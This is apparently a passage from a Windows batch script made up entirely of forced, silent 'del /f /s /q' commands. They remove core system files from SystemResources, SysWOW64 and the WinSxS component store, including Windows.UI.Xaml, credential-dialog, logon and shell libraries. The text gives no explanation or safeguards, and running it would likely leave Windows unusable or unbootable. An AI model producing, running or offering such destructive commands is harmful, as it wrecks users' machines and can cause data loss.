del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-400_contrast-black.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-400_contrast-white.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-100_contrast-black.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-100_contrast-white.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-125_contrast-black.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-125_contrast-white.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-150_contrast-black.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-150_contrast-white.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-200_contrast-black.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-200_contrast-white.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-400_contrast-black.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-400_contrast-white.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\NetworkUX\Assets" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\NetworkUX\Assets\Fonts" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\NetworkUX\Assets\Fonts\SettingsIcons.ttf" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\pris\Windows.UI.ShellCommon.en-US.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\QuickActions\Assets" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\QuickActions\Assets\AXPIcons.ttf" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\SharePickerUI\Assets" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\SharePickerUI\Assets\Fonts" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\SharePickerUI\Assets\Fonts\SharMDL2.ttf" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI\Assets" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI\Assets\Fonts" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI\Assets\officehub150x150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI\Assets\officehub71x71.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI\Assets\onenote150x150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI\Assets\onenote71x71.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI\Assets\Fonts\BitMDL2.ttf" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI\Assets\Fonts\SkypeUISymbol-Regular.ttf" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommonInetCore\pris" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommonInetCore\Windows.UI.ShellCommonInetCore.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommonInetCore\WindowsInternal.Xaml.Controls.Tabs" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommonInetCore\pris\Windows.UI.ShellCommonInetCore.en-US.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommonInetCore\WindowsInternal.Xaml.Controls.Tabs\Assets" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommonInetCore\WindowsInternal.Xaml.Controls.Tabs\Assets\Fonts" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommonInetCore\WindowsInternal.Xaml.Controls.Tabs\Assets\Fonts\BrowserMDL.ttf" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.TaskManager\pris" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.TaskManager\Windows.UI.TaskManager.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.TaskManager\pris\Windows.UI.TaskManager.en-US.pri" /f /s /q
del "C:\Windows\SysWOW64\Windows.UI.Accessibility.dll" /f /s /q
del "C:\Windows\SysWOW64\Windows.UI.Core.TextInput.dll" /f /s /q
del "C:\Windows\SysWOW64\Windows.UI.Cred.dll" /f /s /q
del "C:\Windows\SysWOW64\Windows.UI.CredDialogController.dll" /f /s /q
del "C:\Windows\SysWOW64\Windows.UI.dll" /f /s /q
del "C:\Windows\SysWOW64\Windows.UI.FileExplorer.dll" /f /s /q
del "C:\Windows\SysWOW64\Windows.UI.FileExplorer.WASDK.dll" /f /s /q
del "C:\Windows\SysWOW64\Windows.UI.Immersive.dll" /f /s /q
del "C:\Windows\SysWOW64\Windows.UI.Input.Inking.Analysis.dll" /f /s /q
del "C:\Windows\SysWOW64\Windows.UI.Input.Inking.dll" /f /s /q
del "C:\Windows\SysWOW64\Windows.UI.Search.dll" /f /s /q
del "C:\Windows\SysWOW64\Windows.UI.Xaml.Controls.dll" /f /s /q
del "C:\Windows\SysWOW64\Windows.UI.Xaml.dll" /f /s /q
del "C:\Windows\SysWOW64\Windows.UI.Xaml.InkControls.dll" /f /s /q
del "C:\Windows\SysWOW64\Windows.UI.Xaml.Maps.dll" /f /s /q
del "C:\Windows\SysWOW64\Windows.UI.Xaml.Phone.dll" /f /s /q
del "C:\Windows\SysWOW64\Windows.UI.XamlHost.dll" /f /s /q
del "C:\Windows\SysWOW64\en-US\Windows.UI.Input.Inking.dll.mui" /f /s /q
del "C:\Windows\SysWOW64\WinMetadata\Windows.UI.winmd" /f /s /q
del "C:\Windows\SysWOW64\WinMetadata\Windows.UI.Xaml.winmd" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-onecore-a..sibility-experience_31bf3856ad364e35_10.0.22621.2506_none_6b9bd6e801b27dc0\Windows.UI.Accessibility.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-onecore-a..sibility-experience_31bf3856ad364e35_10.0.22621.2506_none_6b9bd6e801b27dc0\f\Windows.UI.Accessibility.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-onecore-a..sibility-experience_31bf3856ad364e35_10.0.22621.2506_none_6b9bd6e801b27dc0\r\Windows.UI.Accessibility.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-a..skmanager.resources_31bf3856ad364e35_10.0.22621.2506_en-us_ebae69d8223faa30\Windows.UI.TaskManager.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-a..skmanager.resources_31bf3856ad364e35_10.0.22621.2506_en-us_ebae69d8223faa30\f\Windows.UI.TaskManager.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-a..skmanager.resources_31bf3856ad364e35_10.0.22621.2506_en-us_ebae69d8223faa30\r\Windows.UI.TaskManager.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-advancedtaskmanager_31bf3856ad364e35_10.0.22621.2792_none_8eb4fe5967268eb4\Windows.UI.TaskManager.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-advancedtaskmanager_31bf3856ad364e35_10.0.22621.2792_none_8eb4fe5967268eb4\f\Windows.UI.TaskManager.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-advancedtaskmanager_31bf3856ad364e35_10.0.22621.2792_none_8eb4fe5967268eb4\r\Windows.UI.TaskManager.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-appdefaults.resources_31bf3856ad364e35_10.0.22621.1_en-us_0e504f2e5e6ac911\Windows.UI.AppDefaults.dll.mui" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-appdefaults_31bf3856ad364e35_10.0.22621.2506_none_d2c591f2c4f7b42e\Windows.UI.AppDefaults.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-appdefaults_31bf3856ad364e35_10.0.22621.2506_none_d2c591f2c4f7b42e\f\Windows.UI.AppDefaults.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-appdefaults_31bf3856ad364e35_10.0.22621.2506_none_d2c591f2c4f7b42e\r\Windows.UI.AppDefaults.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-c..ontroller.resources_31bf3856ad364e35_10.0.22621.1_en-us_8cd6df30e4ee1365\Windows.UI.CredDialogController.dll.mui" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-creddialogcontroller_31bf3856ad364e35_10.0.22621.2506_none_0cdf2f26dee87b4d\Windows.UI.CredDialogController.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-creddialogcontroller_31bf3856ad364e35_10.0.22621.2506_none_0cdf2f26dee87b4d\f\Windows.UI.CredDialogController.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-creddialogcontroller_31bf3856ad364e35_10.0.22621.2506_none_0cdf2f26dee87b4d\r\Windows.UI.CredDialogController.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-d..ctui-resourceswin81_31bf3856ad364e35_10.0.22621.1_none_7d7e5e0d80f786f1\Windows.UI.Xaml.Resources.win81.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-d..ui-resourceswin8rtm_31bf3856ad364e35_10.0.22621.1_none_ec48a461d684adc1\Windows.UI.Xaml.Resources.win8rtm.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-directui-resources19h1_31bf3856ad364e35_10.0.22621.1_none_52ec67724094312f\Windows.UI.Xaml.Resources.19h1.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-directui-resources21h1_31bf3856ad364e35_10.0.22621.1_none_53b46e00400a562e\Windows.UI.Xaml.Resources.21h1.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-directui-resourcesrs1_31bf3856ad364e35_10.0.22621.1_none_bd97a1235581e454\Windows.UI.Xaml.Resources.rs1.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-directui-resourcesrs2_31bf3856ad364e35_10.0.22621.1_none_bd98a16d5580fdab\Windows.UI.Xaml.Resources.rs2.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-directui-resourcesrs3_31bf3856ad364e35_10.0.22621.1_none_bd99a1b755801702\Windows.UI.Xaml.Resources.rs3.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-directui-resourcesrs4_31bf3856ad364e35_10.0.22621.1_none_bd9aa201557f3059\Windows.UI.Xaml.Resources.rs4.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-directui-resourcesrs5_31bf3856ad364e35_10.0.22621.1_none_bd9ba24b557e49b0\Windows.UI.Xaml.Resources.rs5.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-directui-resourcesth_31bf3856ad364e35_10.0.22621.1_none_30ff4cd02123fe20\Windows.UI.Xaml.Resources.th.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_970653fe6a0d1287\Windows.UI.Xaml.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_970653fe6a0d1287\Windows.UI.Xaml.Resources.Common.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_970653fe6a0d1287\f\Windows.UI.Xaml.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_970653fe6a0d1287\f\Windows.UI.Xaml.Resources.Common.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_970653fe6a0d1287\r\Windows.UI.Xaml.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_970653fe6a0d1287\r\Windows.UI.Xaml.Resources.Common.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-i...appxmain.resources_31bf3856ad364e35_10.0.22621.2861_en-us_be26ad19791a8a78\Windows.UI.SettingsAppThreshold.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-i...appxmain.resources_31bf3856ad364e35_10.0.22621.2861_en-us_be26ad19791a8a78\f\Windows.UI.SettingsAppThreshold.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-i...appxmain.resources_31bf3856ad364e35_10.0.22621.2861_en-us_be26ad19791a8a78\r\Windows.UI.SettingsAppThreshold.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-i..ntrolpanel.appxmain_31bf3856ad364e35_10.0.22621.2792_none_fa8c2de212aeffe6\Windows.UI.SettingsAppThreshold.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-i..ntrolpanel.appxmain_31bf3856ad364e35_10.0.22621.2792_none_fa8c2de212aeffe6\f\Windows.UI.SettingsAppThreshold.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-i..ntrolpanel.appxmain_31bf3856ad364e35_10.0.22621.2792_none_fa8c2de212aeffe6\r\Windows.UI.SettingsAppThreshold.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-inputservice_31bf3856ad364e35_10.0.22621.2792_none_99b7f4cab531a349\Windows.UI.Core.TextInput.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-inputservice_31bf3856ad364e35_10.0.22621.2792_none_99b7f4cab531a349\f\Windows.UI.Core.TextInput.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-inputservice_31bf3856ad364e35_10.0.22621.2792_none_99b7f4cab531a349\r\Windows.UI.Core.TextInput.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-p..alog.core.resources_31bf3856ad364e35_10.0.22621.2506_en-us_884c97faf651599e\Windows.UI.PrintDialog.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-p..d-library.resources_31bf3856ad364e35_10.0.22621.1_en-us_16be39094a98258f\Windows.UI.PicturePassword.dll.mui" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-p..urepassword-library_31bf3856ad364e35_10.0.22621.1_none_72a541ee9cbe801c\Windows.UI.PicturePassword.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-printdialog.core_31bf3856ad364e35_10.0.22621.2506_none_c0ac442099d1239d\Windows.UI.PrintDialog.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_10c05ec783812334\Windows.UI.winmd" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_10c05ec783812334\Windows.UI.Xaml.winmd" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_10c05ec783812334\f\Windows.UI.winmd" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_10c05ec783812334\f\Windows.UI.Xaml.winmd" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_10c05ec783812334\r\Windows.UI.winmd" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_10c05ec783812334\r\Windows.UI.Xaml.winmd" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-s..dminflows.resources_31bf3856ad364e35_10.0.22621.2506_en-us_e1e22d452a6cded4\Windows.UI.SettingsAdminFlowUIThreshold.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-s..dminflows.resources_31bf3856ad364e35_10.0.22621.2506_en-us_e1e22d452a6cded4\f\Windows.UI.SettingsAdminFlowUIThreshold.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-s..dminflows.resources_31bf3856ad364e35_10.0.22621.2506_en-us_e1e22d452a6cded4\r\Windows.UI.SettingsAdminFlowUIThreshold.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-s..hreshold-adminflows_31bf3856ad364e35_10.0.22621.2792_none_007a421b998a317a\Windows.UI.SettingsAdminFlowUIThreshold.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-s..hreshold-adminflows_31bf3856ad364e35_10.0.22621.2792_none_007a421b998a317a\f\Windows.UI.SettingsAdminFlowUIThreshold.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-s..hreshold-adminflows_31bf3856ad364e35_10.0.22621.2792_none_007a421b998a317a\r\Windows.UI.SettingsAdminFlowUIThreshold.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-s..ink-inkanalysiscore_31bf3856ad364e35_10.0.22621.1_none_aa7c9c53ef1e6cd6\Windows.UI.Input.Inking.Analysis.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-s..ncehost.shellcommon_31bf3856ad364e35_10.0.22621.3007_none_28d3419fd1260c93\Windows.UI.ActionCenter.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-s..ncehost.shellcommon_31bf3856ad364e35_10.0.22621.3007_none_28d3419fd1260c93\Windows.UI.QuickActions.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-s..ncehost.shellcommon_31bf3856ad364e35_10.0.22621.3007_none_28d3419fd1260c93\f\Windows.UI.ActionCenter.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-s..ncehost.shellcommon_31bf3856ad364e35_10.0.22621.3007_none_28d3419fd1260c93\f\Windows.UI.QuickActions.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-s..ncehost.shellcommon_31bf3856ad364e35_10.0.22621.3007_none_28d3419fd1260c93\r\Windows.UI.ActionCenter.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-s..ncehost.shellcommon_31bf3856ad364e35_10.0.22621.3007_none_28d3419fd1260c93\r\Windows.UI.QuickActions.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-s..ndlers-nt.resources_31bf3856ad364e35_10.0.22621.2506_en-us_e1c191afd8d8f6e6\Windows.UI.SettingsHandlers-nt.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-s..ndlers-nt.resources_31bf3856ad364e35_10.0.22621.2506_en-us_e1c191afd8d8f6e6\f\Windows.UI.SettingsHandlers-nt.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-s..ndlers-nt.resources_31bf3856ad364e35_10.0.22621.2506_en-us_e1c191afd8d8f6e6\r\Windows.UI.SettingsHandlers-nt.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-s..ndlers-nt.resources_31bf3856ad364e35_10.0.22621.3007_en-us_e1f78c69d8b081f9\Windows.UI.SettingsHandlers-nt.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-s..ndlers-nt.resources_31bf3856ad364e35_10.0.22621.3007_en-us_e1f78c69d8b081f9\f\Windows.UI.SettingsHandlers-nt.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-s..ndlers-nt.resources_31bf3856ad364e35_10.0.22621.3007_en-us_e1f78c69d8b081f9\r\Windows.UI.SettingsHandlers-nt.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-s..riencehost.appxmain_31bf3856ad364e35_10.0.22621.2792_none_dca88e457a95c152\Windows.UI.SoftLanding.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-s..riencehost.appxmain_31bf3856ad364e35_10.0.22621.2792_none_dca88e457a95c152\f\Windows.UI.SoftLanding.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-s..riencehost.appxmain_31bf3856ad364e35_10.0.22621.2792_none_dca88e457a95c152\r\Windows.UI.SoftLanding.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-s..settingshandlers-nt_31bf3856ad364e35_10.0.22621.3007_none_5df6ee22ce8e78a0\Windows.UI.SettingsHandlers-nt.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-s..settingshandlers-nt_31bf3856ad364e35_10.0.22621.3007_none_5df6ee22ce8e78a0\f\Windows.UI.SettingsHandlers-nt.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-s..settingshandlers-nt_31bf3856ad364e35_10.0.22621.3007_none_5df6ee22ce8e78a0\r\Windows.UI.SettingsHandlers-nt.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..-controls.resources_31bf3856ad364e35_10.0.22621.1_en-us_4a382a521107e8b6\Windows.UI.Xaml.Controls.dll.mui" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..aml-phone.resources_31bf3856ad364e35_10.0.22621.1_en-us_c478a37645904f0a\Windows.UI.Xaml.Phone.dll.mui" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..d-library.resources_31bf3856ad364e35_10.0.22621.2506_en-us_c6de915a33bca65f\Windows.UI.Cred.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..eexplorer.resources_31bf3856ad364e35_10.0.22621.2506_en-us_ef0f04b04bf96d70\Windows.UI.FileExplorer.dll.mui" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..eexplorer.resources_31bf3856ad364e35_10.0.22621.2506_en-us_ef0f04b04bf96d70\f\Windows.UI.FileExplorer.dll.mui" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..eexplorer.resources_31bf3856ad364e35_10.0.22621.2506_en-us_ef0f04b04bf96d70\r\Windows.UI.FileExplorer.dll.mui" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..ell-sharedutilities_31bf3856ad364e35_10.0.22621.2506_none_ab1f68bc85f79f90\Windows.UI.Shell.SharedUtilities.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..ell-sharedutilities_31bf3856ad364e35_10.0.22621.2506_none_ab1f68bc85f79f90\f\Windows.UI.Shell.SharedUtilities.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..ell-sharedutilities_31bf3856ad364e35_10.0.22621.2506_none_ab1f68bc85f79f90\r\Windows.UI.Shell.SharedUtilities.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..ernal-adaptivecards_31bf3856ad364e35_10.0.22621.1_none_1eb104dda2fe5c9c\Windows.UI.Shell.Internal.AdaptiveCards.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..k-library.resources_31bf3856ad364e35_10.0.22621.2506_en-us_969c6f85b7434b5e\Windows.UI.BioFeedback.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..kcontrols.resources_31bf3856ad364e35_10.0.22621.1_en-us_b938c9fb614fcd56\Windows.UI.Xaml.InkControls.dll.mui" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..kedshutdown-library_31bf3856ad364e35_10.0.22621.1_none_f9c77629fd98bf20\Windows.UI.BlockedShutdown.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..kedshutdown-library_31bf3856ad364e35_10.0.22621.1_none_f9c77629fd98bf20\Windows.UI.BlockedShutdown.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-desktop.resources_31bf3856ad364e35_10.0.22621.2506_en-us_19c3fe1a523589c3\Windows.UI.ShellCommon.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-desktop.resources_31bf3856ad364e35_10.0.22621.2506_en-us_19c3fe1a523589c3\f\Windows.UI.ShellCommon.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-desktop.resources_31bf3856ad364e35_10.0.22621.2506_en-us_19c3fe1a523589c3\r\Windows.UI.ShellCommon.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-desktop.resources_31bf3856ad364e35_10.0.22621.3007_en-us_19f9f8d4520d14d6\Windows.UI.ShellCommon.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-desktop.resources_31bf3856ad364e35_10.0.22621.3007_en-us_19f9f8d4520d14d6\f\Windows.UI.ShellCommon.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-desktop.resources_31bf3856ad364e35_10.0.22621.3007_en-us_19f9f8d4520d14d6\r\Windows.UI.ShellCommon.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-library.resources_31bf3856ad364e35_10.0.22621.2506_en-us_2955f18be12a2ca3\Windows.UI.BlockedShutdown.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-library.resources_31bf3856ad364e35_10.0.22621.2506_en-us_f3baf1b955d1bb4c\Windows.UI.Logon.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-library.resources_31bf3856ad364e35_10.0.22621.2506_en-us_f3baf1b955d1bb4c\f\Windows.UI.Logon.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-library.resources_31bf3856ad364e35_10.0.22621.2506_en-us_f3baf1b955d1bb4c\r\Windows.UI.Logon.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..ninetcore.resources_31bf3856ad364e35_10.0.22621.2506_en-us_8ef2b2082a8472af\Windows.UI.ShellCommonInetCore.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..rer-wasdk.resources_31bf3856ad364e35_10.0.22621.2506_en-us_56685fb6d5165a87\Windows.UI.FileExplorer.WASDK.dll.mui" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-u..rer-wasdk.resources_31bf3856ad364e35_10.0.22621.2506_en-us_56685fb6d5165a87\n\Windows.UI.FileExplorer.WASDK.dll.mui" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-biofeedback-library_31bf3856ad364e35_10.0.22621.2506_none_e1e315c2bb4a5883\Windows.UI.BioFeedback.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-biofeedback-library_31bf3856ad364e35_10.0.22621.2506_none_e1e315c2bb4a5883\Windows.UI.BioFeedback.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-biofeedback-library_31bf3856ad364e35_10.0.22621.2506_none_e1e315c2bb4a5883\f\Windows.UI.BioFeedback.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-biofeedback-library_31bf3856ad364e35_10.0.22621.2506_none_e1e315c2bb4a5883\f\Windows.UI.BioFeedback.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-biofeedback-library_31bf3856ad364e35_10.0.22621.2506_none_e1e315c2bb4a5883\r\Windows.UI.BioFeedback.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-biofeedback-library_31bf3856ad364e35_10.0.22621.2506_none_e1e315c2bb4a5883\r\Windows.UI.BioFeedback.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_9f29ab110e06bc1c\Windows.UI.Cred.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_9f29ab110e06bc1c\Windows.UI.Cred.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_9f29ab110e06bc1c\f\Windows.UI.Cred.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_9f29ab110e06bc1c\f\Windows.UI.Cred.pri" /f /s /q
